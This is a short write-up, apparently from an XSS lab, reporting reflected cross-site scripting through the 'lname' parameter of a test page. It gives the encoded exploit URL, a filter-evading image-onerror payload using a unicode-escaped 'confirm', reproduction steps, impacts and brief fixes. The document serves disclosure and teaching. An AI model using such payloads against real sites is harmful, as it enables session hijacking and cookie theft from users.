# Reflected Cross-Site Scripting (XSS) via `lname` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `lname` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="u9gsa1"
http://kzlabs.com/punishment/12.php?fname=adnnlad&lname=%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%281%29%3E
```

---

## Vulnerable Parameter

```text id="hhs73d"
lname
```

---

## Payload Used

```html id="r2v4ze"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/12.php?fname=adnnlad&lname=%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%281%29%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text id="ap71cf"
http://kzlabs.com/punishment/12.php?fname=adnnlad&lname=%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%281%29%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/48ed7c3a-938e-4f02-bd8f-98a8b5e5adc4" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
